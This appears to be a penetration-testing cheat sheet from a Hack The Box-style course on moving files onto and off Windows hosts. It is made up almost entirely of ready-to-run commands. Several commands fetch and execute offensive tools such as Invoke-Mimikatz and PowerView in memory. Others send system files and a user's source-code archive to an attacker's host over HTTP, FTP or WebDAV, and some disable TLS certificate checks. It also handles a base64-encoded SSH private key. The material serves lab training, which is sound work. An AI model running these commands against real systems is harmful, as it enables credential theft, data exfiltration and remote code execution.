---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Windows File Transfer Methods

{% embed url="https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic" %}

{% embed url="https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool" %}

### PowerShell Base64 Encode & Decode

{% code overflow="wrap" fullWidth="true" %}
```
#Pwnbox Check SSH Key MD5 Hash
md5sum id_rsa

#Pwnbox Encode SSH Key to Base64
cat id_rsa |base64 -w 0;echo

#POWERSHELL WINDOWS Pwnbox Encode SSH Key to Base64
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05d......LQo="))

#WINDOWS POWERSHELL  Confirming the MD5 Hashes Match
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
{% endcode %}

### PowerShell Web Downloads

| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |

{% embed url="https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0" %}

**PowerShell DownloadFile Method**

{% code overflow="wrap" fullWidth="true" %}
```
#File Download
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
```
{% endcode %}

**PowerShell DownloadString - Fileless Method**

{% code overflow="wrap" fullWidth="true" %}
```
#PowerShell DownloadString - Fileless Method
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
{% endcode %}

**PowerShell Invoke-WebRequest**

{% code overflow="wrap" fullWidth="true" %}
```
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
{% endcode %}

Common Errors with PowerShell

{% hint style="info" %}
```
-UseBasicParsing
```
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
{% endcode %}

{% hint style="info" %}
PS C:\htb> \[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
{% endcode %}

### SMB Downloads

Create the SMB Server

```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

**Copy a File from the SMB Server**

```
C:\htb> copy \\192.168.220.133\share\nc.exe
```

**Create the SMB Server with a Username and Password**

```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

**Mount the SMB Server with Username and Password**

```
C:\htb> net use n: \\192.168.220.133\share /user:test test
```

### FTP Downloads

**Installing the FTP Server Python3 Module - pyftpdlib**

```
sudo pip3 install pyftpdlib
```

Setting up a Python3 FTP Server

```
sudo python3 -m pyftpdlib --port 21
```

**Transfering Files from an FTP Server Using PowerShell**

{% code fullWidth="true" %}
```
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
```
{% endcode %}

**Create a Command File for the FTP Client and Download the Target File**

```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

### Upload Operations

### PowerShell Base64 Encode & Decode

Encode File Using PowerShell

{% code fullWidth="true" %}
```
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
{% endcode %}

**Decode Base64 String in Linux**

{% code fullWidth="true" %}
```
echo IyBDbQ........AgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
md5sum hosts
```
{% endcode %}

### PowerShell Web Uploads

Installing a Configured WebServer with Upload

```
pip3 install uploadserver
python3 -m uploadserver
```

PowerShell Script to Upload a File to Python Upload Server

{% code overflow="wrap" fullWidth="true" %}
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

```
{% endcode %}

#### PowerShell Base64 Web Upload

{% code overflow="wrap" fullWidth="true" %}
```
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
{% endcode %}

```
nc -lvnp 8000
echo <base64> | base64 -d -w 0 > hosts
```

### SMB Uploads

Installing WebDav Python modules

```
sudo pip install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

Connecting to the Webdav Share

```
C:\htb> dir \\192.168.49.128\DavWWWRoot
```

Uploading Files using SMB

```
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

### FTP Uploads

Uploading File

```
sudo python3 -m pyftpdlib --port 21 --write
```

PowerShell Upload File

{% code overflow="wrap" fullWidth="true" %}
```
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
{% endcode %}

Create a Command File for the FTP Client to Upload a File

```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
